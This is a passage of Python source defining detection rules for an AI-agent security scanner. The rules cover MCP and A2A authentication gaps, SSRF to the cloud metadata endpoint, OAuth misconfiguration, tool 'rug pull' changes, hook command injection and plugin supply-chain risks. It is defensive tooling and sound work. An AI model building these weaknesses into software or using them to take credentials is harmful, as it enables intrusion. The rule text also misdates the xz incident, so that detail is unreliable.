    "A2A skill definitions lack input schemas, allowing unvalidated data to be passed "
    "between agents. Unvalidated cross-agent payloads are the canonical "
    "ASI08 Agent Communication Poisoning primitive.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Define explicit JSON schemas for all skill inputs.",
    sarif_name="A2aNoInputSchema",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI07", "ASI08"],
    adversa_references=["ADV-A2A-03"],
)

_r(
    "AAK-A2A-004",
    "A2A endpoint using HTTP instead of HTTPS",
    "An A2A agent endpoint uses HTTP instead of HTTPS.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Use HTTPS for all A2A endpoints.",
    sarif_name="A2aHttpEndpoint",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-04"],
)

_r(
    "AAK-A2A-005",
    "JWT token lifetime exceeds 1 hour",
    "An A2A Agent Card configures a JWT token lifetime greater than 1 hour (3600 seconds). "
    "Long-lived tokens increase the window for token theft and replay attacks.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Set JWT token lifetime to 1 hour (3600 seconds) or less. Use refresh tokens for longer sessions.",
    sarif_name="JwtTokenLifetimeTooLong",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-A2A-006",
    "Weak JWT validation configuration",
    "An A2A Agent Card disables JWT signature verification or allows the 'none' algorithm, "
    "permitting token forgery.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Enable signature verification and restrict algorithms to RS256 or ES256. Never allow 'none'.",
    sarif_name="WeakJwtValidation",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-A2A-007",
    "Agent impersonation risk",
    "An A2A Agent Card lacks an 'id' or 'identity' field, or uses an HTTP endpoint, "
    "making it susceptible to agent impersonation attacks.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Add a unique 'id' or 'identity' field to the Agent Card and use HTTPS endpoints.",
    sarif_name="AgentImpersonationRisk",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI10"],
    adversa_references=["ADV-AUTH-01"],
)

# ---------------------------------------------------------------------------
# Legal Compliance (3 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-LEGAL-001",
    "Copyleft license (AGPL/SSPL) in dependency",
    "A dependency uses a copyleft license (AGPL, SSPL) that may impose obligations "
    "on your project.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Review license obligations. Consider replacing with permissively-licensed alternatives.",
    sarif_name="CopyleftLicenseDep",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
)

_r(
    "AAK-LEGAL-002",
    "Dependency with no declared license",
    "A dependency has no declared license, creating legal uncertainty about usage rights.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Contact the maintainer to clarify licensing or replace with a properly licensed alternative.",
    sarif_name="NoLicenseDep",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
)

_r(
    "AAK-LEGAL-003",
    "DMCA-flagged package detected",
    "A dependency has been flagged for DMCA/IP violations or contains leaked proprietary code.",
    Severity.CRITICAL,
    Category.LEGAL_COMPLIANCE,
    "Remove the flagged dependency immediately.",
    sarif_name="DmcaFlaggedPackage",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
)

# ---------------------------------------------------------------------------
# Rug Pull Detection (3 rules) - uses TOOL_POISONING category
# ---------------------------------------------------------------------------

_r(
    "AAK-RUGPULL-001",
    "Tool definition changed since last pin",
    "A tool's definition (name, description, or input schema) has changed since it was "
    "last pinned. This could indicate a rug pull attack.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Review the changes. If legitimate, re-pin with 'agent-audit-kit pin'. If suspicious, remove the server.",
    sarif_name="ToolDefinitionChanged",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-RUGPULL-01"],
)

_r(
    "AAK-RUGPULL-002",
    "New tool added since last pin",
    "A new tool was added to an MCP server since the last pin. New tools should be "
    "reviewed before approval.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Review the new tool's definition and permissions. Pin if approved.",
    sarif_name="NewToolSincePin",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-RUGPULL-02"],
)

_r(
    "AAK-RUGPULL-003",
    "Tool removed since last pin",
    "A previously pinned tool was removed from an MCP server. This could indicate "
    "covering tracks after an attack.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Investigate why the tool was removed. Update pins if removal was intentional.",
    sarif_name="ToolRemovedSincePin",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-RUGPULL-03"],
)


# ---------------------------------------------------------------------------
# 2026 MCP Authentication Bypass Wave (AAK-MCP-011..020)
#
# References:
#   - NVD: CVE-2026-33032 (Nginx-UI MCP endpoint auth bypass, CVSS 9.8) —
#     https://nvd.nist.gov/vuln/detail/CVE-2026-33032
#   - GHSA: https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h6c2-x2m2-mwhf
#   - MCP spec 2025-11-25: OAuth 2.1 mandatory for remote servers.
#   - OWASP MCP Top 10 MCP01:2025 (Broken Authentication), MCP07:2025
#     (Insecure Transport), MCP08:2025 (Insecure CORS).
#   - CWE-287 (Improper Authentication), CWE-306 (Missing Authentication),
#     CWE-346 (Origin Validation Error), CWE-307 (Improper Restriction
#     of Excessive Authentication Attempts).
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-011",
    "Remote MCP server handler lacks authentication middleware",
    "A remote MCP server exposes an HTTP handler with no authentication check. "
    "Per MCP spec 2025-11-25 all remote servers must require OAuth 2.1 or an "
    "equivalent bearer credential. Matches the CVE-2026-33032 pattern where "
    "/mcp_message was exposed without the auth middleware that /mcp used.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply the same auth middleware to every MCP HTTP route. Do not branch on "
    "method or path before enforcing auth.",
    sarif_name="McpHandlerNoAuth",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP01:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-012",
    "MCP server default IP allowlist is empty (allow-all)",
    "An MCP server's IP allowlist configuration defaults to an empty list, "
    "which its middleware interprets as 'allow all'. This is the exact "
    "CVE-2026-33032 root cause. Tight-by-default is required.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Default to deny-all; require explicit allowlist entries. Reject empty "
    "allowlists at startup.",
    sarif_name="McpAllowlistEmpty",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-02"],
)

_r(
    "AAK-MCP-013",
    "Wildcard CORS on MCP endpoint",
    "An MCP HTTP endpoint sets Access-Control-Allow-Origin to '*' while also "
    "returning credentials/tokens. This allows hostile origins to read MCP "
    "responses from a victim browser session.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Restrict CORS to an explicit origin allowlist. Never combine '*' with "
    "Access-Control-Allow-Credentials: true.",
    sarif_name="McpCorsWildcard",
    owasp_mcp_references=["MCP08:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-03"],
)

_r(
    "AAK-MCP-014",
    "Auth token transmitted via URL query parameter",
    "An MCP client or server expects authentication tokens in URL query "
    "parameters. Query parameters land in server access logs, browser "
    "history, and referer headers, making this a token-leak vector.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Pass tokens in the Authorization header, never in query params.",
    sarif_name="McpAuthInQueryParam",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-04"],
)

_r(
    "AAK-MCP-015",
    "Path traversal in MCP resource handler",
    "An MCP server exposes a resource/file handler that passes user-supplied "
    "paths to open()/fs.readFile without normalization or allowlist checks. "
    "2,614 MCP implementations surveyed; 82% had this class of issue.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Resolve the requested path, reject '..' components, and verify the "
    "final path is under an explicit root directory.",
    sarif_name="McpPathTraversal",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-RES-01"],
)

_r(
    "AAK-MCP-016",
    "Unbounded prompt/argument size on MCP endpoint",
    "An MCP server endpoint accepts request bodies without a maximum-size "
    "limit. This enables token-cost denial-of-service and memory exhaustion.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set a per-endpoint max body size (e.g. 1 MiB by default) and reject "
    "requests that exceed it.",
    sarif_name="McpUnboundedPayload",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-DOS-01"],
)

_r(
    "AAK-MCP-017",
    "MCP server accepts HTTP (non-TLS) in production config",
    "An MCP server configuration binds to plain HTTP without TLS. MCP spec "
    "2025-11-25 requires Streamable HTTP over TLS for remote servers.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Bind only to HTTPS. Terminate TLS at a trusted proxy or use the server's "
    "native TLS support. Reject plain-HTTP binds in production mode.",
    sarif_name="McpPlainHttp",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TRANSPORT-01"],
)

_r(
    "AAK-MCP-018",
    "Missing rate limiting on MCP endpoint",
    "An MCP server endpoint does not declare rate limiting. Unrestricted "
    "access allows credential stuffing and enumeration attacks.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Add per-IP and per-token rate limits. Reject bursts above the limit with 429.",
    sarif_name="McpNoRateLimit",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-DOS-02"],
)

_r(
    "AAK-MCP-019",
    "MCP auth check runs after side-effect",
    "An MCP handler performs work (e.g. db lookups, external calls) before "
    "verifying authentication. This reveals existence/shape of protected "
    "resources via timing and error channels.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Enforce authentication as the first step of every handler. Do not branch "
    "on caller input before the auth check.",
    sarif_name="McpAuthAfterSideEffect",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-05"],
)

_r(
    "AAK-MCP-020",
    "MCP handler shares routing with an unauthenticated path",
    "Two MCP HTTP routes share a single handler but only one is wrapped in "
    "auth middleware. The second route inherits the tool surface without the "
    "auth check. This is the CVE-2026-33032 bypass pattern.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply auth middleware at the router level, not per-route. Or, wrap the "
    "shared handler in the auth check.",
    sarif_name="McpSharedHandlerAuthGap",
    cve_references=["CVE-2026-33032"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

# ---------------------------------------------------------------------------
# MCP SSRF Patterns (AAK-SSRF-001..005)
#
# References:
#   - 36.7% of 7,000 surveyed MCP servers had SSRF-exposed tool handlers.
#   - OWASP MCP Top 10 MCP09:2025 (Server-Side Request Forgery).
#   - OWASP Top 10 A10:2021 (SSRF).
#   - CWE-918 (Server-Side Request Forgery).
# ---------------------------------------------------------------------------

_r(
    "AAK-SSRF-001",
    "Unvalidated outbound HTTP in MCP tool handler",
    "An MCP tool handler fetches a URL provided by the caller with no "
    "host/scheme validation. This is the classic SSRF shape (CWE-918).",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Validate the scheme (https only), resolve the host, and reject "
    "private-range IPs (RFC 1918, 169.254.*, 127.*, ::1/128, fc00::/7).",
    sarif_name="SsrfUnvalidatedUrl",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)

_r(
    "AAK-SSRF-002",
    "Localhost/loopback reachable from MCP tool",
    "An MCP tool handler forwards user-supplied URLs that could target "
    "127.0.0.1/localhost/::1, reaching internal services bound to loopback.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Block loopback and link-local addresses after DNS resolution.",
    sarif_name="SsrfLoopbackReachable",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-02"],
)

_r(
    "AAK-SSRF-003",
    "Cloud metadata endpoint reachable via MCP tool",
    "An MCP tool accepts URLs that can reach 169.254.169.254 (AWS/Azure/GCP "
    "metadata) or metadata.google.internal, allowing exfiltration of "
    "instance credentials.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Block 169.254.0.0/16 and metadata.google.internal at the HTTP client "
    "layer. Use a deny-by-default IP allowlist.",
    sarif_name="SsrfCloudMetadata",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-03"],
)

_r(
    "AAK-SSRF-004",
    "Redirect chains followed without re-validation",
    "An MCP tool follows HTTP redirects using the default client settings. "
    "An attacker can bypass initial host checks by returning a 3xx to an "
    "internal address. DNS rebinding works the same way.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Disable automatic redirects, or re-run host validation on every hop. "
    "Cap total redirects at 3.",
    sarif_name="SsrfRedirectRevalidation",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-04"],
)

_r(
    "AAK-SSRF-005",
    "Missing SSRF allowlist on outbound fetch",
    "An MCP tool performs outbound HTTP but has no allowlist of permitted "
    "destinations. Deny-by-default with an explicit allowlist is the only "
    "reliable defense against SSRF chains.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Maintain an explicit allowlist of hostnames; reject anything else.",
    sarif_name="SsrfNoAllowlist",
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-05"],
)

# ---------------------------------------------------------------------------
# OAuth 2.1 Misconfiguration (AAK-OAUTH-001..005)
#
# References:
#   - MCP spec 2025-11-25: OAuth 2.1 mandatory, PKCE+S256 required,
#     DPoP under SEP review.
#   - RFC 9700 (OAuth 2.1 Security BCPs).
#   - RFC 9449 (DPoP).
#   - OWASP MCP01:2025 (Broken Authentication).
#   - CWE-287 (Improper Authentication), CWE-522 (Credentials Transmitted
#     in Cleartext), CWE-348 (Use of Less Trusted Source).
# ---------------------------------------------------------------------------

_r(
    "AAK-OAUTH-001",
    "OAuth flow without PKCE",
    "An OAuth 2.1 client flow does not use PKCE. PKCE is mandatory for all "
    "MCP remote server clients per spec 2025-11-25, including confidential "
    "clients.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Add a code_verifier/code_challenge pair to every authorization request. "
    "Use code_challenge_method=S256.",
    sarif_name="OAuthMissingPkce",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-06"],
)

_r(
    "AAK-OAUTH-002",
    "PKCE using the plain challenge method",
    "An OAuth client sets code_challenge_method=plain (or omits it). S256 "
    "is mandatory; 'plain' leaks the verifier to anyone with access to the "
    "authorization request.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Set code_challenge_method=S256 and derive code_challenge as "
    "BASE64URL(SHA256(code_verifier)).",
    sarif_name="OAuthPkcePlain",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-07"],
)

_r(
    "AAK-OAUTH-003",
    "OAuth token passthrough between tenants",
    "An MCP server receives a bearer token from one identity and forwards "
    "it to a downstream service without re-minting. This is the 'confused "
    "deputy' shape banned by OAuth 2.1 BCPs.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Use token-exchange (RFC 8693) or a service account to call downstream "
    "services. Never forward a user token across trust boundaries.",
    sarif_name="OAuthTokenPassthrough",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-08"],
)

_r(
    "AAK-OAUTH-004",
    "Wildcard or overly-broad redirect_uri",
    "An OAuth client registers a wildcard, localhost-with-any-port, or "
    "overly-broad redirect_uri. Attackers can hijack authorization codes "
    "via dangling subdomains or open redirectors.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Register exact-match redirect URIs only. No wildcards.",
    sarif_name="OAuthWildcardRedirect",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-09"],
)

_r(
    "AAK-OAUTH-005",
    "Bearer token used where DPoP or mTLS is required",
    "An MCP remote server accepts plain Bearer tokens on a flow that MCP "
    "spec 2025-11-25 flags for DPoP (Demonstrating Proof of Possession) "
    "or mTLS-bound tokens. A stolen Bearer token is fully replayable.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Require DPoP proofs or mTLS-bound tokens for high-privilege flows. "
    "Validate the token's cnf claim.",
    sarif_name="OAuthBearerWhereDpopRequired",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-10"],
)

# AAK-OAUTH-006 — RFC 9207 `iss` validation (MCP 2026-07-28 RC, SEP-2468).
# The 2026-07-28 release candidate requires OAuth clients to validate the `iss`
# authorization-response parameter per RFC 9207, a low-cost mitigation for the
# mix-up attack class that MCP's single-client / many-server pattern makes more
# likely. A future spec version will require clients to reject responses that
# omit `iss`. Source: blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/
_r(
    "AAK-OAUTH-006",
    "OAuth client does not validate the `iss` authorization-response parameter (RFC 9207)",
    "An OAuth authorization-code client processes the authorization response / "
    "redirect callback (reads `code` and `state`, or exchanges the code at the "
    "token endpoint) but never references the `iss` parameter. The MCP "
    "2026-07-28 spec release candidate (SEP-2468) requires clients to validate "
    "`iss` on authorization responses per RFC 9207 — without it, an attacker "
    "who controls one authorization server in MCP's single-client / "
    "many-server deployment can mount an OAuth mix-up attack and have the "
    "client redeem a code at the wrong server. This is the token-issuer-validation "
    "arm of the 2026-07-28 final MCP auth profile (scanned together with RFC 8707 "
    "resource indicators, `AAK-OAUTH-007`, and RFC 9728 Protected-Resource-Metadata "
    "discovery, `AAK-OAUTH-008`, via `--profile mcp-2026-07-28`). A later spec "
    "version will require rejecting responses that omit `iss` entirely.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Validate the `iss` authorization-response parameter against the expected "
    "issuer of the authorization server the request was sent to (RFC 9207), "
    "and reject the response on mismatch. Have your authorization server emit "
    "`iss` now so the check can be enforced before the 2026-07-28 cutover.",
    sarif_name="OAuthMissingIssValidation",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
)

# AAK-OAUTH-007 — RFC 8707 Resource Indicators (`resource` parameter).
# The *ratified* MCP 2025-11-25 authorization spec makes Resource Indicators
# mandatory: MCP clients MUST send the `resource` parameter on both the
# authorization request and the token request, set to the MCP server's
# canonical URI, so the authorization server audience-binds the issued token
# (RFC 8707 §2; aligns with RFC 9728 §7.4). Without it a token minted for one
# MCP server can be replayed at another — the confused-deputy / audience-
# confusion class the spec's "Access Token Privilege Restriction" section
# forbids. This is a requirement of the current ratified spec, not a
# 2026-07-28 release-candidate change. Source:
#   https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
_r(
    "AAK-OAUTH-007",
    "OAuth flow does not set the RFC 8707 `resource` parameter (Resource Indicators)",
    "An OAuth 2.1 authorization/token flow — or an MCP client/server config that "
    "advertises OAuth 2.1 — builds authorization and/or token requests without the "
    "RFC 8707 `resource` parameter. The ratified MCP 2025-11-25 authorization spec "
    "requires MCP clients to send `resource` on both the authorization request and "
    "the token request, identifying the MCP server by its canonical URI, so the "
    "authorization server audience-binds the issued token. Without Resource "
    "Indicators the token is not bound to a specific MCP server, so a token minted "
    "for one server can be replayed at another (token replay / audience confusion) "
    "— the confused-deputy class OAuth 2.1 §5.2 and the MCP spec's Access Token "
    "Privilege Restriction section forbid.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set the `resource` parameter to the MCP server's canonical URI so issued "
    "tokens are audience-bound (RFC 8707, on both the authorization and token "
    "requests); reject tokens whose audience is not this server (validate the "
    "audience per RFC 8707 §2 / RFC 9728 §7.4).",
    sarif_name="OAuthMissingResourceIndicator",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
)

# AAK-OAUTH-008 — RFC 9728 Protected Resource Metadata discovery gap.
# The ratified MCP 2025-11-25 auth spec makes RFC 9728 a MUST: an MCP server
# advertises its authorization server(s) via Protected Resource Metadata at
# `/.well-known/oauth-protected-resource`, and clients discover auth that way
# rather than carrying a static credential. This is the resource-discovery arm
# of the 2026-07-28 final auth profile (`--profile mcp-2026-07-28`, with
# AAK-OAUTH-006 iss-validation + AAK-OAUTH-007 resource indicators). Source:
#   https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
_r(
    "AAK-OAUTH-008",
    "MCP OAuth surface with no RFC 9728 Protected Resource Metadata discovery",
    "A remote MCP OAuth surface presents no RFC 9728 Protected Resource Metadata "
    "discovery: a client config points at a remote (HTTP/SSE) MCP server and "
    "carries an inline / static credential (an `Authorization` / `Bearer` header, "
    "an `auth` block, or an embedded token) with no reference to "
    "`/.well-known/oauth-protected-resource`, `authorization_servers`, or "
    "`resource_metadata`; or MCP server source enforces bearer auth (e.g. "
    "`WWW-Authenticate`, a FastMCP `BearerAuthProvider`) without serving Protected "
    "Resource Metadata. The ratified MCP 2025-11-25 auth spec requires servers to "
    "implement RFC 9728 so clients can discover the authorization server and obtain "
    "an audience-bound token instead of relying on a pre-shared secret; the "
    "2026-07-28 final auth profile builds on it. Without PRM the deployment cannot "
    "participate in discovery-based auth and typically hardcodes credentials.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Serve RFC 9728 Protected Resource Metadata at "
    "`/.well-known/oauth-protected-resource` (with an `authorization_servers` "
    "entry) and have clients discover the authorization server from it — via the "
    "`resource_metadata` field of a 401 `WWW-Authenticate` challenge — instead of "
    "embedding a static bearer/token credential in the MCP client config.",
    sarif_name="OAuthMissingProtectedResourceMetadata",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
)

# ---------------------------------------------------------------------------
# Claude Code Hook RCE (AAK-HOOK-RCE-001..003)
#
# References:
#   - NVD: CVE-2025-59536 (Claude Code hooks RCE) —
#     https://nvd.nist.gov/vuln/detail/CVE-2025-59536
#   - OWASP Top 10 A03:2021 (Injection).
#   - CWE-78 (OS Command Injection), CWE-94 (Code Injection).
# ---------------------------------------------------------------------------

_r(
    "AAK-HOOK-RCE-001",
    "Hook command interpolates user-controlled input",
    "A Claude Code hook script command-string interpolates a variable or "
    "captured group directly into a shell command. This is the CVE-2025-59536 "
    "shape: a poisoned config file triggers arbitrary code execution.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Never interpolate hook input into a shell string. Use an argv list and a "
    "no-shell exec. Quote with shlex.quote if a shell is absolutely required.",
    sarif_name="HookRceInterpolation",
    cve_references=["CVE-2025-59536"],
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-RCE-01"],
)

_r(
    "AAK-HOOK-RCE-002",
    "Hook runs with shell=True and variable interpolation",
    "A hook script invokes subprocess.run / spawn with shell=True (or the "
    "equivalent in Node/Bash) while passing a composed string that includes "
    "caller-provided fields.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Use shell=False and pass argv as a list. If a shell is needed, build "
    "commands from quoted constants only.",
    sarif_name="HookShellTrue",
    cve_references=["CVE-2025-59536"],
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-RCE-02"],
)

_r(
    "AAK-HOOK-RCE-003",
    "Hook trust check is bypassable by project-local config",
    "A settings.local.json or project-relative hook file executes before "
    "the Claude Code trust prompt. This is the core CVE-2025-59536 regression "
    "pattern; any project-contained hook must not run until trust is "
    "confirmed.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Require explicit trust confirmation before loading project-local hook "
    "configuration. Upgrade to Claude Code 1.0.111 or later.",
    sarif_name="HookTrustBypass",
    cve_references=["CVE-2025-59536"],
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-RCE-03"],
)

# ---------------------------------------------------------------------------
# LangChain Path Traversal (AAK-LANGCHAIN-001..003)
#
# References:
#   - NVD: CVE-2026-34070 (LangChain load_prompt absolute path /
#     .. traversal) — https://nvd.nist.gov/vuln/detail/CVE-2026-34070
#   - NVD: CVE-2025-68664 — https://nvd.nist.gov/vuln/detail/CVE-2025-68664
#   - GHSA-r399-636x-v7f6 (LangChain serialization injection).
#   - CWE-22 (Path Traversal), CWE-502 (Deserialization of Untrusted Data).
# ---------------------------------------------------------------------------

_r(
    "AAK-LANGCHAIN-001",
    "Project depends on LangChain < 1.2.22 (load_prompt path traversal)",
    "A dependency file pins langchain or langchain-core to a version earlier "
    "than 1.2.22. CVE-2026-34070 allows absolute paths and '..' traversal "
    "via load_prompt() / load_prompt_from_config().",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade to langchain-core >= 1.2.22. If you must keep the legacy "
    "behavior, pass allow_dangerous_paths=True explicitly.",
    sarif_name="LangchainPathTraversalVuln",
    cve_references=["CVE-2026-34070"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SUPPLY-01"],
    auto_fixable=True,
)

_r(
    "AAK-LANGCHAIN-002",
    "Call to load_prompt without allow_dangerous_paths review",
    "Source code calls langchain.load_prompt() or load_prompt_from_config() "
    "with a user-controlled path argument. Even on patched versions, the "
    "allow_dangerous_paths escape hatch is a sharp edge.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Treat load_prompt() as a file read against a trusted root. Resolve, "
    "normalize, and verify the path is inside the intended directory.",
    sarif_name="LangchainLoadPromptUserPath",
    cve_references=["CVE-2026-34070"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SUPPLY-02"],
)

_r(
    "AAK-LANGCHAIN-003",
    "LangChain deserialization of untrusted data",
    "A dependency file pins langchain / langchainjs to a version vulnerable "
    "to GHSA-r399-636x-v7f6 / CVE-2025-68664, a serialization-injection "
    "chain that extracts secrets through crafted saved chains.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade to the patched LangChain / langchainjs release; avoid loading "
    "serialized chains from sources you do not fully control.",
    sarif_name="LangchainDeserializeUntrusted",
    cve_references=["CVE-2025-68664"],
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-03"],
    auto_fixable=True,
)

# ---------------------------------------------------------------------------
# .claude-plugin/marketplace.json Security (AAK-MARKETPLACE-001..004)
#
# References:
#   - Anthropic Claude Code plugins/marketplaces (GA Apr 2026).
#   - OWASP MCP03:2025 (Supply Chain).
#   - CWE-494 (Download of Code Without Integrity Check), CWE-918 (SSRF
#     in postinstall), CWE-1357 (Reliance on Insufficiently Trustworthy
#     Component).
# ---------------------------------------------------------------------------

_r(
    "AAK-MARKETPLACE-001",
    "Unsigned marketplace.json manifest",
    ".claude-plugin/marketplace.json lacks a signature or integrity hash "
    "field. An attacker with write access to the marketplace can replace "
    "the plugin bundle with no detection.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Add a Sigstore signature or subresource-integrity hash to each plugin "
    "entry. Verify on install.",
    sarif_name="MarketplaceUnsigned",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-04"],
)

_r(
    "AAK-MARKETPLACE-002",
    "Plugin permission set grants broad access",
    "A plugin's manifest grants access to filesystem, network, shell exec, "
    "or user-credential surfaces. Broad permissions should be opt-in after "
    "a clear user prompt.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Trim permissions to the minimum the plugin needs. Review any 'fs:*' "
    "or 'shell:exec' entries.",
    sarif_name="MarketplaceBroadPermissions",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-05"],
)

_r(
    "AAK-MARKETPLACE-003",
    "Plugin name typosquats a well-known package",
    "A plugin entry uses a name that is one edit distance from a popular "
    "upstream (e.g. 'anthropic', 'langchain', 'mcp'). Typosquatting is the "
    "single highest-volume supply-chain attack vector in 2026.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Rename the plugin or flag it for manual review. Cross-reference against "
    "a known-upstream list.",
    sarif_name="MarketplaceTyposquat",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-06"],
)

_r(
    "AAK-MARKETPLACE-004",
    "Plugin source pins to a mutable git ref",
    "A plugin entry pins to a branch (main/master) or tag without commit "
    "SHA. The maintainer (or an attacker with write access) can silently "
    "change plugin behavior post-install — the 'maintainer takeover' "
    "pattern from the June 2024 xz incident and its 2026 re-runs.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin to an immutable commit SHA. Re-pin during a reviewed dependency "
    "bump.",
    sarif_name="MarketplaceMutableRef",
